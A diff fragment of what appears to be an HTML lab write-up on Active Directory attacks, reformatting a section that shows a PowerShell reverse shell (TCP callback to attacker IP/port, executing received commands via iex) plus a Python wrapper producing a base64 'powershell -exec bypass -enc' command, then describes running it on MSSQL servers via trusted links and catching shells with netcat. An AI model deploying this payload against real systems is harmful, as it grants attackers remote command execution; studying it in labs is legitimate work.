-    $c = New-Object System.Net.Sockets.TCPClient('%s',%s);
-    $s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
-    while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
-        $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
-        $sb = (iex $d 2>&1 | Out-String );
-        $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
-        $s.Write($sb,0,$sb.Length);
-        $s.Flush()
-    };
-    $c.Close()
-    """ % (sys.argv[1], sys.argv[2])
-</p>
+<p>    payload="""</p>
+<p>    $c = New-Object System.Net.Sockets.TCPClient('%s',%s);</p>
+<p>    $s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};</p>
+<p>    while(($i = $s.Read($b, 0, $b.Length)) -ne 0){</p>
+<p>        $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);</p>
+<p>        $sb = (iex $d 2&gt;&amp;1 | Out-String );</p>
+<p>        $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps&gt; ');</p>
+<p>        $s.Write($sb,0,$sb.Length);</p>
+<p>        $s.Flush()</p>
+<p>    };</p>
+<p>    $c.Close()</p>
+<p>    """ % (sys.argv[1], sys.argv[2])</p>
 
-<p>
-    byte = payload.encode('utf-16-le')
-    b64 = base64.b64encode(byte)
-    print("powershell -exec bypass -enc %s" % b64.decode())
-</p>
+<p>    byte = payload.encode('utf-16-le')</p>
+<p>    b64 = base64.b64encode(byte)</p>
+<p>    print("powershell -exec bypass -enc %s" % b64.decode())</p>
     </code></pre>
 
-<p>
-    Let’s convert how powershell payload to base64 using local IP and local port listening for the connection.
-</p>
+<p>    Let’s convert how powershell payload to base64 using local IP and local port listening for the connection.</p>
 
-    <img src="images/image-305.png" alt="Untitled">
+    <img src="images/image-191.png" alt="Untitled">
 
-<p>
-    After that we just have to execute this command into our MSSQL server since we have abused trusted links.
-</p>
+<p>    After that we just have to execute this command into our MSSQL server since we have abused trusted links.</p>
 
-    <img src="images/image-306.png" alt="Untitled">
+    <img src="images/image-192.png" alt="Untitled">
 
-<p>
-    Listening on NetCat  in port 8080 as stated when converting the powershell payload to base64, We are able to get reverse shell from Castelback MSSQL and from BRAAVOS MSSQL server as well.
-</p>
+<p>    Listening on NetCat  in port 8080 as stated when converting the powershell payload to base64, We are able to get reverse shell from Castelback MSSQL and from BRAAVOS MSSQL server as well.</p>
 
-    <img src="images/image-307.png" alt="Untitled">
+    <img src="images/image-193.png" alt="Untitled">
 
-<p>
-- 
-</p>
-<div class="part-navigation">
-      <a href="part-5-adcs.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: ADCS</a>
-      <a href="part-7-privilege-escalation.html">Next: PrivEsc <ion-icon name="arrow-forward-outline"></ion-icon></a>
-    </div>
+<p>-</p>
         </section>
       </article>
     </div>
